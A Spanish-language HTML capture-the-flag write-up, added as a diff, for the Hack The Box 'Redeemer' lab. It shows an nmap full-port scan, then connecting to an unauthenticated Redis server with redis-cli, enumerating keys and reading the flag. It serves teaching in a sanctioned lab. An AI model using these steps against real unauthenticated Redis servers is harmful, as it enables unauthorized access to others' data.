@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="es-US">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<link rel="stylesheet" href="style.css">
+<title>HTB Redeemer WriteUp</title>
+<link rel="icon" type="image/png" sizes="64x64" href="https://avatars.githubusercontent.com/u/124062596?v=4">
+<meta property="og:title" content="HTB Redeemer WriteUp" />
+<meta name="description" content="HTB Redeemer WriteUp" />
+<meta name="og:description" content="HTB Redeemer WriteUp" />
+<meta property="og:site_name" content="HTB Redeemer WriteUp" />
+<meta property="og:type" content="website" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+    <aside>
+        <img 
+            src="https://avatars.githubusercontent.com/u/124062596?v=4"
+            id="box_img"
+            >
+        <h1>Redeemer</h1>
+        <p>Clasificación: Muy fácil. </p>
+        <hr>
+    </aside>
+    <center><div id="p2">
+
+        <p><strong style="color: rgb(127, 56, 160); font-size:large">1</strong><img src="https://raw.githubusercontent.com/33nity/33nity.github.io/main/img/arrow.png" style="height: 15px; width: 15px; opacity: 0.7">
+            Empezamos escaneando los puertos abiertos de la máquina, utilizando Nmap, la IP que nos indica HTB y las opciones -sV y -p- para que busque entre todos los puertos, desde el 1 al 65535, si hay uno abierto y en el caso en que lo haya,
+            nos indique el servicio.
+        </p>
+
+    </div></center>
+
+    <center><section id ="cmd">
+    <div><h5 style="text-align: left; margin-left: 10px; font-family:Arial"><strong style="color: rgb(127, 56, 160)">~ root@Threenity# </strong>nmap -sV -p- 10.129.237.23</h5></div>
+
+        <div><pre style="text-align: left; margin-left: 20px; color: bisque">
+
+Nmap scan report for 10.129.237.23
+Host is up (0.045s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+6379/tcp open  redis   Redis key-value store 5.0.7
+
+
+        </pre></div>
+    </section></center>
+    <center><div id="p2">
+
+        <p><strong style="color: rgb(127, 56, 160); font-size:large">2</strong><img src="https://raw.githubusercontent.com/33nity/33nity.github.io/main/img/arrow.png" style="height: 15px; width: 15px; opacity: 0.7">
+            Nos indica que hay solo está abierto el puerto 6379 correspondiente a servicio Redis.
+        </p>
+        
+        <p><img src="https://raw.githubusercontent.com/33nity/33nity.github.io/main/img/teacher.png" style="height: 20px; width: 20px"><strong style="color: rgb(127, 56, 160); font-size:large"> Breve pausita didáctica </strong><img src="https://raw.githubusercontent.com/33nity/33nity.github.io/main/img/arrow.png" style="height: 10px; width: 10px; opacity: 0.7">
+            Redis (Remote Dictionary Server) es un motor de base de datos en memoria de código abierdo, basado en el almacenamiento en tablas de hashes
+            pero que opcionalmente puede ser usada como una base de datos entre otros usos. Los datos se almacenan en un formato diccionario
+            por pares ("key-value"). Normalmente es utilizada para el almacenamiento de datos a corto plazo que necesitan una recuperación rápida,
+            también puede hacer copias de seguridad en discos duros para aumentar la consistencia.
+        </p>
+    </div></center>
+
+    <center><div id="p2">
+
+        <p><strong style="color: rgb(127, 56, 160); font-size:large">3</strong><img src="https://raw.githubusercontent.com/33nity/33nity.github.io/main/img/arrow.png" style="height: 15px; width: 15px; opacity: 0.7">
+            Para obtener más información, interactuar y enumerarlo vamos a utilizar la herramienta Redis CLI. Con la opción -h podemos seleccionar el servidor Redis al que queremos conectarnos.
+
+    </div></center>
+
+    <center><section id ="cmd">
+    <div><h5 style="text-align: left; margin-left: 10px; font-family:Arial"><strong style="color: rgb(127, 56, 160)">~ root@Threenity# </strong>redis-cli -h 10.129.237.23</h5></div>
+
+        <div><pre style="text-align: left; margin-left: 20px; color: bisque">
+10.129.237.23:6379> 
+        </pre></div>
+    </section></center>
+    <center><div id="p2">
+
+        <p><strong style="color: rgb(127, 56, 160); font-size:large">4</strong><img src="https://raw.githubusercontent.com/33nity/33nity.github.io/main/img/arrow.png" style="height: 15px; width: 15px; opacity: 0.7">
+            Una vez conectados, utilizamos el comando info dentro de la terminal de Redis, para enumerar la base de datos.
+    </div></center>
+    <center><section id ="cmd">
+        <div><pre style="text-align: left; margin-left: 20px; color: bisque">
+10.129.237.23:6379> info
+# Server
+redis_version:5.0.7
+redis_git_sha1:00000000
+redis_git_dirty:0
+redis_build_id:66bd629f924ac924
+redis_mode:standalone
+os:Linux 5.4.0-77-generic x86_64
+arch_bits:64
+multiplexing_api:epoll
+atomicvar_api:atomic-builtin
+gcc_version:9.3.0
+process_id:752
+run_id:a03990005d408088da298effac28ab19044ae9dc
+tcp_port:6379
+uptime_in_seconds:354
+uptime_in_days:0
+hz:10
+configured_hz:10
+lru_clock:5333578
+executable:/usr/bin/redis-server
+config_file:/etc/redis/redis.conf
+
+[...]
+
+# Keyspace
+db0:keys=4,expires=0,avg_ttl=0
+
+        </pre></div>
+    </section></center>
+    <center><div id="p2">
+
+        <p><strong style="color: rgb(127, 56, 160); font-size:large">5</strong><img src="https://raw.githubusercontent.com/33nity/33nity.github.io/main/img/arrow.png" style="height: 15px; width: 15px; opacity: 0.7">
+            Aparecen varias secciones, pero esta vez nos vamos a quedar con la denominada #Keyspace.
+        Entre otras cosas, esta nos indica el número de claves que hay en cada base de datos.
+        En este caso podemos ver que solo existe una base de datos asignada con el índice 0.
+        Para seleccionarla usaremos el comando select seguido del índice.</p>
+    </div></center>
+    <center><section id ="cmd">
+            <div><pre style="text-align: left; margin-left: 20px; color: bisque">
+10.129.237.23:6379> select 0
+OK
+        </pre></div>
+    </section></center>
+    <center><div id="p2">
+
+        <p><strong style="color: rgb(127, 56, 160); font-size:large">6</strong><img src="https://raw.githubusercontent.com/33nity/33nity.github.io/main/img/arrow.png" style="height: 15px; width: 15px; opacity: 0.7">
+            Para listar las claves de la base de datos seleccionada utilizaremos el comando keys *.</p>
+    </div></center>
+    <center><section id ="cmd">
+        <div><pre style="text-align: left; margin-left: 20px; color: bisque">
+10.129.237.23:6379> keys *
+1) "numb"
+2) "flag"
+3) "temp"
+4) "stor"
+    </pre></div>
+</section></center>
+<center><div id="p2">
+
+    <p><strong style="color: rgb(127, 56, 160); font-size:large">7</strong><img src="https://raw.githubusercontent.com/33nity/33nity.github.io/main/img/arrow.png" style="height: 15px; width: 15px; opacity: 0.7">
+        Podemos ver que una de las claves es posible que contenga la flag. Por lo que para ver el valor asignado a esa clave utilizamos el comando get.
+    Una vez obtenida la flag podremos finalizar la conexión.</p>
+</div></center>
+<center><section id ="cmd">
+    <div><pre style="text-align: left; margin-left: 20px; color: bisque">
+10.129.237.23:6379> get flag
+10.129.237.23:6379> exit
+</pre></div>
+</section></center>
+
+        
+        <center><div id="p2" style="margin-bottom: 150px">
+            <p><strong style="color: rgb(127, 56, 160); font-size:large">OJO !</strong><img src="https://raw.githubusercontent.com/33nity/33nity.github.io/main/img/arrow.png" style="height: 15px; width: 15px; opacity: 0.7">
+            Para pwnear esta máquina, HTB te pide contestar unas pocas preguntas como complemento al proceso de obtener la flag. 
+            </p>                
+            </div></center>
+    
+    
+    <p><center><a href="./../../" style="color: yellowgreen">Página Principal</a></center></p>
+
+</body>
+</html>
